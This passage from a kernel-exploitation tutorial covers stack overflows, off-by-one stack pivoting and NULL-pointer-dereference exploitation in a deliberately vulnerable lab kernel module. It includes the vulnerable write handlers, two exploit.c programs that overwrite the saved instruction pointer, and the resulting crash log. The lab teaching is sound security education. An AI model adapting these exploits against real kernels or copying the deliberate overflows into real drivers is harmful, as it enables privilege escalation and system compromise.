  <span style="color:#66d9ef">if</span> (unlikely(res))
    memset(to <span style="color:#f92672">+</span> (n <span style="color:#f92672">-</span> res), <span style="color:#ae81ff">0</span>, res);

    <span style="color:#75715e">/* 
</span><span style="color:#75715e">    *  If there is an error, the kernel land buffer 
</span><span style="color:#75715e">    *  is filled with NULL bytes.
</span><span style="color:#75715e">    */</span>

  <span style="color:#66d9ef">return</span> res; <span style="color:#75715e">/* 0 on success and n on error */</span>
}

<span style="color:#75715e">/* the raw_copy_from_user(to, from, n) is just: */</span>

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>
raw_copy_from_user(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>to, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>from, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> len)
{
  <span style="color:#66d9ef">return</span> __copy_user(to, (__force <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)from, len);
}

<span style="color:#75715e">/* 
</span><span style="color:#75715e">*  Finally raw_copy_from_user is just a call to __copy_user (a memcpy) 
</span><span style="color:#75715e">*  And __copy_from_user is just a call to raw_copy_from_user with less checks 
</span><span style="color:#75715e">*/</span>

<span style="color:#66d9ef">static</span> __always_inline __must_check <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>
__copy_from_user(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>to, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>from, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> n)
{
	might_fault();
	kasan_check_write(to, n);
	check_object_size(to, n, false);
	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">raw_copy_from_user</span>(to, from, n);
}
</code></pre></div><p>All this quest is just led in order to make you understanding that copy_from_user is just a call to memcpy with a lot of checks. But for clarity we are using raw_copy_from_user and not directly memcpy when we want to create dangerous behaviours.</p>
<p>We will see the two cases in a dangerous write handler of a device:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* Same structure than previously */</span>
<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> write_buf {  
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> length;
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>rbuf;
} wr_struct;

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">vuln1_write</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t user_count, loff_t <span style="color:#f92672">*</span>offt) {
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> vuln_buf[LEN_MAX];
  memset(vuln_buf, <span style="color:#ae81ff">0x0</span>, LEN_MAX);
  <span style="color:#75715e">/* We fill the vuln_buf of 0x0 */</span>

  wr_struct <span style="color:#f92672">*</span>argp <span style="color:#f92672">=</span> (wr_struct <span style="color:#f92672">*</span>)buf; <span style="color:#75715e">/* We are getting the user&#39;s arg */</span>

  <span style="color:#75715e">/*
</span><span style="color:#75715e">  *  if (raw_copy_from_user(vuln_buf, (const char __user *)argp-&gt;rbuf, user_count)) {
</span><span style="color:#75715e">  *     return -1;
</span><span style="color:#75715e">  *  }
</span><span style="color:#75715e">  *
</span><span style="color:#75715e">  *  If we uncomment it, the crash will occur and the code below will not
</span><span style="color:#75715e">  *  be executed, but the for loop or any equivalent while loop will create 
</span><span style="color:#75715e">  *  the same dangerous behaviour.
</span><span style="color:#75715e">  *
</span><span style="color:#75715e">  *
</span><span style="color:#75715e">  *  raw_copy_from_user(vuln_buf, (const char __user *)argp-&gt;rbuf, user_count) call is very 
</span><span style="color:#75715e">  *  dangerous because if the user_count send by the user is bigger than LEN_MAX,
</span><span style="color:#75715e">  *  the vuln_write&#39;s stack frame will be overflowed.
</span><span style="color:#75715e">  *  And it can overwrite the saved instruction pointer and redirect the control flow !! 
</span><span style="color:#75715e">  */</span>

  <span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
  <span style="color:#66d9ef">for</span> (i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> argp<span style="color:#f92672">-&gt;</span>length; i<span style="color:#f92672">++</span>) {
    vuln_buf[i] <span style="color:#f92672">=</span> argp<span style="color:#f92672">-&gt;</span>rbuf[i];
    printk(<span style="color:#e6db74">&#34;%x&#34;</span>, vuln_buf[i]);
  }

  <span style="color:#75715e">/* 
</span><span style="color:#75715e">  *  Just above, we can notice that the for loop is looping on argp-&gt;length in 
</span><span style="color:#75715e">  *  order to copy argp-&gt;length bytes from our userland buffer in the kernel-land 
</span><span style="color:#75715e">  *  buffer vuln_buf and if argp-&gt;length &gt; LEN_MAX, into the vuln_write&#39;s local variables and even further !.
</span><span style="color:#75715e">  *  Tt can be dangerous if it allow us to overwrite and control the saved instruction
</span><span style="color:#75715e">  *  pointer at the top of the stackframe.
</span><span style="color:#75715e">  */</span>

  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>Now that we know how to send a payload to a write handler we can write the payload below without any issues:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* exploit.c */</span>

<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdarg.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#define LEN 250
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> write_buf {  
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> length;
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>rbuf;
} wr_struct;

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
  <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/dev/vuln1&#34;</span>, O_RDWR);

  wr_struct to_send;
  to_send.length <span style="color:#f92672">=</span> LEN;

  to_send.rbuf <span style="color:#f92672">=</span> malloc(LEN);
  memset(to_send.rbuf, <span style="color:#ae81ff">0xff</span>, LEN);

  <span style="color:#66d9ef">if</span> (write(fd, <span style="color:#f92672">&amp;</span>to_send, LEN) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
      printf(<span style="color:#e6db74">&#34;[Error sending pld]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
  }

  printf(<span style="color:#e6db74">&#34;[pld send]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);

  close(fd);
  free(to_send.rbuf);

  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>We have just to compile the KLM, and load it in kernel land with insmod:</p>
<pre><code># make
make -C /lib/modules/3.19.0-31-generic/build SUBDIRS=/media/sf_C-C++/pwn_stuff/Kernel_Exploit/vuln1 modules
make[1]: Entering directory '/usr/src/linux-headers-3.19.0-31-generic'
  Building modules, stage 2.
  MODPOST 1 modules
make[1]: Leaving directory '/usr/src/linux-headers-3.19.0-31-generic'
# insmod main.ko &lt;- Load the kernel module in memory
# gcc exploit.c -g -o pld
# ./pld
Segmentation fault
# dmesg # &lt;- Command used to display kernel logs
[47655.844948] vuln1: Init
[47729.624822] [Open]
[47729.624946] fffffffffffffffffffffffffff [...]
[47729.625118] general protection fault: 0000 [#12] 
[47729.625122] SMP 
[...]
[47729.625171] task: ffff88007a0dbae0 ti: ffff8800692d4000 task.ti: ffff8800692d4000
[49382.393576] RIP: 0010:[ffffffffffffffff]  [ffffffffffffffff] 0xffffffffffffffff
[49382.393584] RSP: 0018:ffff880069333ee8  EFLAGS: 00010246
[49382.393588] RAX: 0000000000000000 RBX: ffffffffffffffff RCX: 0000000000002f06
[49382.393592] RDX: 000000000000bdfc RSI: 0000000000000246 RDI: 0000000000000246
[49382.393595] RBP: ffffffffffffffff R08: ffffffff81ed7120 R09: 000000000000fffd
[49382.393599] R10: 000000000000102f R11: 000000000000000f R12: ffffffffffffffff
[49382.393602] R13: 00000000000000e0 R14: ffff880069333f50 R15: 0000000000000000
[49382.393608] FS:  00007f9a9c255700(0000) GS:ffff88009d800000(0000) knlGS:0000000000000000
[49382.393612] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[49382.393616] CR2: ffffffffffffffff CR3: 00000000691f6000 CR4: 00000000000406f0
[49382.393625] Stack:
[49382.393627]  ffffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffff
[49382.393634]  ffffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffff
[49382.393640]  ffffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffff
[49382.393646] Call Trace:
[49382.393661]  [ffffffff817b6dcd] ? system_call_fastpath+0x16/0x1b
[49382.393664] Code:  Bad RIP value.
[49382.393672] RIP  [ffffffffffffffff] 0xffffffffffffffff
[49382.393678]  RSP ffff880069333ee8
[49382.393681] CR2: ffffffffffffffff
[49382.393687] ---[ end trace 6f00dcc0b67af37c ]---
</code></pre><p>Just above we see a lot of interesting things, all our stack is filled with a lot of 0xff from our argp-&gt;rbuf, rbp, rbx and r12 are too filled with 0xff because they have been pop at the end of the function. And finally we have seen that rip has been pop at the end of the function and so held the value 0xffffffffffffffff.</p>
<p>Congratz !! Now that we have triggered this write handler, we must compute the offset from which rip is overwritten.</p>
<p>But for now it was just an introduction to the exploitation of this kind of vulnerabilities and if you want to go deeper, take a look at the next part.</p>
<h4 id="off-by-onetwo">Off by one/two<a href="#off-by-onetwo" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>An off by one/two vulnerability occurs when an object is overflowed by only one or two bytes. Typically we can find this kind of vulnerabilities in a loop:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> write_buf {
  <span style="color:#66d9ef">char</span> rbuf[LEN];
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> length;
} wr_struct;

<span style="color:#75715e">/* ... */</span>

<span style="color:#75715e">#define LEN 64
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">vuln1_write</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t user_count, loff_t <span style="color:#f92672">*</span>offt) {
  wr_struct <span style="color:#f92672">*</span>argp <span style="color:#f92672">=</span> (wr_struct <span style="color:#f92672">*</span>)buf;
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>k_write <span style="color:#f92672">=</span> kzalloc(argp<span style="color:#f92672">-&gt;</span>length);

  <span style="color:#75715e">/* The developper tries to be secure lulz */</span>

  <span style="color:#66d9ef">for</span> (ssize_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> argp<span style="color:#f92672">-&gt;</span>length; i<span style="color:#f92672">++</span>) {
    k_write[i] <span style="color:#f92672">=</span> argp<span style="color:#f92672">-&gt;</span>rbuf[i];
  }

  kfree(k_write);

  <span style="color:#75715e">/* Other version of the code without dynamic allocation */</span>

  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> vuln_buf[argp<span style="color:#f92672">-&gt;</span>length];

  <span style="color:#66d9ef">for</span> (ssize_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> LEN; i<span style="color:#f92672">++</span>) {
    vuln_buf[i] <span style="color:#f92672">=</span> argp<span style="color:#f92672">-&gt;</span>rbuf[i];
  }

  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;

}
</code></pre></div><p>As shown above, the off by one appears in the heap because we are allocating our buffer on the kernel heap with kzmalloc or on the stack. The &lt;= makes that if i begins to 0, it will loop from 0 until LEN and so the loop will be executed LEN plus one time. And it leads to an overflow because when an object is of length LEN as seen above, the dereferencement is done on LEN+1 bytes and so the byte next to the buffer on the stack or on the heap can be overwritten. In order to make crash this program above, it&rsquo;s basically the same thing that for a stack based buffer overflow. The difference is that an off by one / two is often not exploitable as we will see later.</p>
<p>But for now it&rsquo;s very important to understand that the sructure of a function is always composed of: one prologue and one epilogue. In intel 64 bits assembly a prologue looks like it:</p>
<pre><code>push rbp
mov rbp, rsp
</code></pre><p>The first instruction is putting our save of rbp on the stack. The second instruction is saving the value of rsp in order to edit this register in the function for creating new local variables. And will restores this value at the end of the function.</p>
<p>The epilogue looks like it:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">leave

<span style="color:#75715e">// leave is equal to:
</span><span style="color:#75715e">//            mov rsp, rbp
</span><span style="color:#75715e">//            pop rbp ; &lt;- The saved value of rbp, pushed on the stack
</span><span style="color:#75715e">//                    ; at the begin of the function is retablished.
</span><span style="color:#75715e"></span>
ret
</code></pre></div><p>The leave instruction will restore the previous value of the stack pointer and so detroy all the local variables created in our function by pushing them on the stack and restores the previous value of rbp with the pop rbp. Finally the ret instruction will pop the value on the stack in rip and so execute the instruction pointed by this address. And our goal is to overwrite either the value on the stack when the ret instruction is executed or for off by one / two heap based overflow, overwrite sensible data in the heap.</p>
<p>For now we will focused our exploitation on off by one / two stack based overflow because heap exploitation depends to the version and the type of your kernel allocator. But we must solve one main constraint: we can overflow only one or two bytes, so how to overlow the saved instruction pointer if there is the saved rbp (base pointer) just before ? And how to do if next to the vulnerable buffer on the stack there is another variable ?</p>
<p>The answer is that for many reasons an off by one is not exploitable but I will try to explain when it is.</p>
<p>An off by one is exploitable when:</p>
<ul>
<li>
<p>[1] The vulnerable buffer is just next to the saved rbp.</p>
</li>
<li>
<p>[2] With the [1] constraint, we can overwrite the first bytes of the saved rbp. But the goal is to overwrite the saved rip or that when the ret instruction is executed, having the control of the value on the top of the stack. In order to do that, we will use a stack pivoting technique. Stack pivoting is just replacing the original rsp by a custom stack pointer that we control. And for our case, we will use the only register that we can control by our on-byte-overflow. It can be done by many gadgets but for off by one exploitation it&rsquo;s often a leave, because he contains as seen above the mov rsp, rbp instruction Without this gadget the exploitation can&rsquo;t be done. The particularity is that the gadget must not be in the vulnerable function but in one of the calling functions. Indeed, when the mov rsp, rbp occurs in the vulnerable function the base pointer hasn&rsquo;t been pop yet. And so we can&rsquo;t control it. But next this instruction, the previous value of rbp saved on the stack at the begin of the function is retablished in rbp. And when the execution returns to the calling functions the value of rbp back and next the call of our vulnerable function is different. And we control the one or two lower bytes !! It&rsquo;s so when the epilogue of the function which has called the vulnerable function come, that often, if this function has local variables the mov rsp, rbp is reached.</p>
</li>
</ul>
<p>The schema below presents it a bit more clearly:</p>

  <img src="/off_one.png"  alt="off-by-one"  class="left"  style="margin-left: auto; margin-right: auto"  />


<p>In {1}, just before the call to our vulnerable foo function the value of rbp is the same that next the mov rbp, rsp instruction from the prologue. And can be for example: 0xffff880069333ee8</p>
<p>In {2}, the execution is transfered to the code of the foo function and the the value of the instruction next the call instruction in the calling function is pushed on the stack.</p>
<p>In {3}, the prologue of the foo function is executed, the saved based pointer is pushed on the stack. And a new stackframe is created.</p>
<p>In {4}, the vulnerable loop is executed and the one / two lower bytes of the saved rbp are overflowed on the stack. Especially because of the [1] constraint.</p>
<p>In {5}, the epilogue is executed, the leave instrcution destroys all the local variables and pop the saved rbp pushed in the prologue.</p>
<p>In {6}, the value of the base pointer is so different, it&rsquo;s still a stack address, but the one / two lower bytes are edited. If we take the random value set previously, before the begin of the foo function, rbp == 0xffff880069333ee8 and now the 0xe8 or the 0x3ee8 bytes can be controlled. And the execution returns to the calling function by poping the saved instruction pointer in rip. The instruction next the call are executed.</p>
<p>Finally the leave instruction, is executing the mov rsp, rbp instruction. But the time with a rbp value partially controlled. The final constraint is so to find a memory area in the stackframe of any functions that we control and which will be used as a custom stack. But if we can overflow only one byte, the range is very limited and depends to the value of the base pointer when the overflow occurs.</p>
<p>In our example the value of rbp when the overflow occurs is of 0xffff880069333ee8 and we can control only the last byte. The 0xffff880069333e is so the base address we can only change a very small offset. One byte represents a range of 255 possibilities And so in the stackframe of the calling function, we can make stack pivoting only on 0xe8 bytes because of the lifo structure of the stack. Indeed, it grows down. So more the last byte of the saved rbp is small, less we have place for finding a location for our custom stack in the stackframe of the calling function. But a solution can be to search a memory area in the calling function of the calling function. With this technique we can use a memory area from the saved rbp around 2^8 bytes for an off by one and around 2^16 bytes for an off by two.</p>
<h4 id="null-pointer-dereference">NULL pointer dereference<a href="#null-pointer-dereference" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>A NULL pointer dereference vulnerability occurs when you try to access to some data located at address 0x0. For example if a structure&rsquo;s pointer is inititialized to 0x0 and that you try to dereference it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* vuln1.c */</span>

<span style="color:#75715e">#define LEN_MAX 16
</span><span style="color:#75715e"></span>
<span style="color:#75715e">/* ... */</span>

<span style="color:#66d9ef">static</span> ssize_t <span style="color:#a6e22e">vuln1_write</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t user_count, loff_t <span style="color:#f92672">*</span>offt) {

  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> k_buf[LEN_MAX];
  ssize_t i;

  wr_struct <span style="color:#f92672">*</span>argp <span style="color:#f92672">=</span> (wr_struct <span style="color:#f92672">*</span>)buf;

  <span style="color:#66d9ef">if</span> (argp<span style="color:#f92672">-&gt;</span>length <span style="color:#f92672">&gt;</span> LEN_MAX) {
    printk(KERN_INFO <span style="color:#e6db74">&#34;[OVERFLOW DETECTED]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
  }

  <span style="color:#75715e">/* The length is checked to avoid overflows :) */</span>

  argp <span style="color:#f92672">=</span> NULL;

  <span style="color:#75715e">/* Init to NULL the pointer toward the struct */</span>

  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; i <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)argp<span style="color:#f92672">-&gt;</span>length; i<span style="color:#f92672">++</span>) {
    k_buf[i] <span style="color:#f92672">=</span> argp<span style="color:#f92672">-&gt;</span>rbuf[i];
  }

  <span style="color:#75715e">/* NULL pointer dereference for each iteration */</span>

  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>It will try to dereference a pointer in a struct located at 0x0. Indeed argp-&gt;rbuf[i] is equivalent to <code>*(*((unsigned long *)(argp + offsetof(argp-&gt;rbuf))) + i * sizeof(unsigned char))</code>. So there are therefore two dereferencements, the first to know the address toward which rbuf points. The second to read the byte (unsigned char) at this address plus the counter (loop counter). The interesting thing is that we can control the bytes at 0x0 if the mmap_min_addr system variable is set to 0x0 (can only be edited when ur root). Its value can be edited (it&rsquo;s usually the case on modern system) to prevent the exploitation of NULL pointers dereferences. But here we will assume that we can use the mmap syscall to map a page at 0x0 and so handle the bytes at this location. It can a bit hard to understand for now, but the address space space of program is segmented in pages of length 0x1000 (bytes) to which are associated some flags especially permissions like is the page executable, is it writable, it belongs to the kernel or not. A virtual address is segmented a few parts according to the level of paging choosen by your operating system (often 4 on 64 bits os). These 4 levels of paging are just table of pointers toward the lower structures where some bits in these pointers are used as boolean flags (not the 64 bits are mandatory to address physically the lower structures). And finnaly the lower structure is pointing toward the physical address of the target page to which is added the last 12 bits of the virtual address (0 to 11). The virtual address is so segmented as a first offset of 12 bits (offset in 2^12=4096 page length), four fields of 9 bits each one which are just an offset in each paging structure (2^9 = 512 entries, entry n is determined by BITS_VADDR * sizeof(unsigned char *) because each entry is a pointer). Finally the cr3 register holds the physical base address of the first paging structure (pmle4) it&rsquo;s mandatory because when it&rsquo;s changed, all the address space is switched (used in context switchs).</p>

  <img src="/four_level_paging.png"  alt="mapping"  class="left"  style="margin-left: auto; margin-right: auto"  />


<p>But it&rsquo;s another subject which will be described in another article and for now you have just to understand that a process is just sharing the pages where the kernel is mapped with the other processes and so when the execution is in kernel land, you can easily access and dereference pointers from userland (not always the case especially with the smap protection) because of the fact that cr3 isn&rsquo;t changed (or it is when KPTI is enabled but the userpages are then mapped in the kernel address space with the NX bit). So if we mmap something at 0x0, when the execution will reach the kernel all the paging structures of the callee process will be kept (and so all the userland pages will be able to be handled by the kernel). That&rsquo;s why a NULL pointer dereference is exploitable. We have juste craft a new wr_struct structure at 0x0, edit the length field to overflow the saved instruction pointer and craft a payload to which its address is handled by the rbuf field of the structure.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/mman.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;assert.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/ioctl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#75715e">/* 
</span><span style="color:#75715e">*  exploit.c
</span><span style="color:#75715e">*  author: nasm 
</span><span style="color:#75715e">*/</span>
  
<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> write_buf {
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> length;
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>rbuf;
} wr_struct;

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {

    <span style="color:#66d9ef">int</span> fd;
    wr_struct to_send <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>}; 
    <span style="color:#75715e">/* The basic structure we send (we need to setup only to_send.length) */</span>
    wr_struct <span style="color:#f92672">*</span>struct_nullp <span style="color:#f92672">=</span> NULL; 
    <span style="color:#75715e">/* The structure we are crafting at 0x0 from userland */</span>
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>pld <span style="color:#f92672">=</span> NULL; 
    <span style="color:#75715e">/* A pointer toward the location which will overflow the vuln1_write&#39;s saved rip */</span>

    <span style="color:#66d9ef">if</span> ((fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/dev/vuln1&#34;</span>, O_RDWR)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x0</span>) {
        printf(<span style="color:#e6db74">&#34;Error open</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
    }

    to_send.length <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10</span>; 
    <span style="color:#75715e">/* must be lower than LEN_MAX */</span>

    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>null_pointer <span style="color:#f92672">=</span> mmap(<span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">1024</span>, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE , 
    MAP_FIXED <span style="color:#f92672">|</span> MAP_PRIVATE <span style="color:#f92672">|</span> MAP_ANONYMOUS , <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x0</span>);

    struct_nullp <span style="color:#f92672">=</span> (wr_struct <span style="color:#f92672">*</span>)null_pointer;
    <span style="color:#75715e">/* Easier to handle with the fields of a struct and not raw offsets */</span> 

    struct_nullp<span style="color:#f92672">-&gt;</span>length <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x28</span><span style="color:#f92672">+</span><span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>); 
    <span style="color:#75715e">/* 
</span><span style="color:#75715e">    *  crash from 0x28 bytes to which we add the length of the 
</span><span style="color:#75715e">    *  pointer we want to erase (saved rip) 
</span><span style="color:#75715e">    */</span>

    struct_nullp<span style="color:#f92672">-&gt;</span>rbuf <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x28</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x8</span>);
    <span style="color:#75715e">/* Same than for the length */</span>

    pld <span style="color:#f92672">=</span> struct_nullp<span style="color:#f92672">-&gt;</span>rbuf<span style="color:#f92672">+</span><span style="color:#ae81ff">0x28</span>;
    <span style="color:#75715e">/*
</span><span style="color:#75715e">    *  Handle directly the address from which the saved rip will be overwritten
</span><span style="color:#75715e">    */</span>

    <span style="color:#f92672">*</span>pld <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)<span style="color:#ae81ff">0x1337</span>;
    <span style="color:#75715e">/*
</span><span style="color:#75715e">    *  Invalid pointer which will leads to a crash but interesting pattern
</span><span style="color:#75715e">    */</span>

    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">==</span> write(fd, <span style="color:#f92672">&amp;</span>to_send, to_send.length)) {
        printf(<span style="color:#e6db74">&#34;[Error sending pld]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
    }

    printf(<span style="color:#e6db74">&#34;[pld send]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);

    close(fd);
    free(struct_nullp<span style="color:#f92672">-&gt;</span>rbuf);

    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">==</span> munmap(null_pointer, <span style="color:#ae81ff">1024</span>)) {
      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
    }

    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>I will not comment all the code, only the main parts, we need to setup two structures: the first to reach the check on the <code>argp-&gt;length</code> field and the second mapped at 0x0, it will overflow the stack frame of the target function by creating the same wr_struct and putting the length and rbuf fields to overflow the saved rip and redirect the control flow. To do this we have to know from which offset rip is overwritten. For this purpose we can at the assembly of the vuln1_write function produced by gcc with IDA:</p>

  <img src="/IDA_main_asm.PNG"  alt="IDA"  class="left"  style="margin-left: auto; margin-right: auto"  />


